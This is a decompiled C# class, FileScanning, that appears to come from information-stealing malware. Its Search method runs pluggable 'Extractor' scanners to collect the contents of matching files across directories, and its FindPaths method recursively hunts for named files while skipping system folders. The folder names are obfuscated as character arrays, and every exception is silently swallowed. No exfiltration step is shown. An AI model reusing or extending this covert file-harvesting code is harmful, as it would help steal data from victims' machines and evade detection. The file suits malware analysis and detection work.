using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x02000012 RID: 18
public static class FileScanning
{
	// Token: 0x06000088 RID: 136 RVA: 0x00006344 File Offset: 0x00004744
	public static List<Entity5> Search(params Extractor[] scanners)
	{
		List<Entity5> list = new List<Entity5>();
		try
		{
			foreach (Extractor extractor in scanners)
			{
				try
				{
					foreach (Entity16 entity in extractor.Id3())
					{
						try
						{
							FileInfo[] files = new DirectoryInfo(entity.Id1).GetFiles(entity.Id2, entity.Id3 ? SearchOption.AllDirectories : SearchOption.TopDirectoryOnly);
							foreach (FileInfo fileInfo in files)
							{
								try
								{
									Entity5 entity2 = new Entity5(fileInfo.FullName)
									{
										Id4 = extractor.Id2(entity, fileInfo),
										Id5 = (string.IsNullOrWhiteSpace(extractor.Id1) ? entity.Id5 : extractor.Id1)
									};
									bool flag = entity2.Id3 != null;
									if (flag)
									{
										bool flag2 = entity2.Id3.Length != 0;
										if (flag2)
										{
											list.Add(entity2);
										}
									}
								}
								catch (Exception ex)
								{
								}
							}
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x06000089 RID: 137 RVA: 0x00006514 File Offset: 0x00004914
	public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
	{
		List<string> list = new List<string>
		{
			new string(new char[]
			{
				'\\',
				'W',
				'i',
				'n',
				'd',
				'o',
				'w',
				's',
				'\\'
			}),
			new string(new char[]
			{
				'\\',
				'P',
				'r',
				'o',
				'g',
				'r',
				'a',
				'm',
				' ',
				'F',
				'i',
				'l',
				'e',
				's',
				'\\'
			}),
			new string(new char[]
			{
				'\\',
				'P',
				'r',
				'o',
				'g',
				'r',
				'a',
				'm',
				' ',
				'F',
				'i',
				'l',
				'e',
				's',
				' ',
				'(',
				'x',
				'8',
				'6',
				')',
				'\\'
			}),
			new string(new char[]
			{
				'\\',
				'P',
				'r',
				'o',
				'g',
				'r',
				'a',
				'm',
				' ',
				'D',
				'a',
				't',
				'a',
				'\\'
			})
		};
		List<string> list2 = new List<string>();
		bool flag = files == null || files.Length == 0 || level > maxLevel;
		List<string> result;
		if (flag)
		{
			result = list2;
		}
		else
		{
			try
			{
				foreach (string text in Directory.GetDirectories(baseDirectory))
				{
					bool flag2 = false;
					foreach (string value in list)
					{
						bool flag3 = text.Contains(value);
						if (flag3)
						{
							flag2 = true;
							break;
						}
					}
					bool flag4 = flag2;
					if (!flag4)
					{
						try
						{
							DirectoryInfo directoryInfo = new DirectoryInfo(text);
							FileInfo[] files2 = directoryInfo.GetFiles();
							bool flag5 = false;
							for (int j = 0; j < files2.Length; j++)
							{
								bool flag6 = flag5;
								if (flag6)
								{
									break;
								}
								for (int k = 0; k < files.Length; k++)
								{
									bool flag7 = flag5;
									if (flag7)
									{
										break;
									}
									string a = files[k];
									FileInfo fileInfo = files2[j];
									bool flag8 = a == fileInfo.Name;
									if (flag8)
									{
										flag5 = true;
										list2.Add(fileInfo.FullName);
									}
								}
							}
							foreach (string item in FileScanning.FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
							{
								bool flag9 = !list2.Contains(item);
								if (flag9)
								{
									list2.Add(item);
								}
							}
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
			}
			result = list2;
		}
		return result;
	}
}
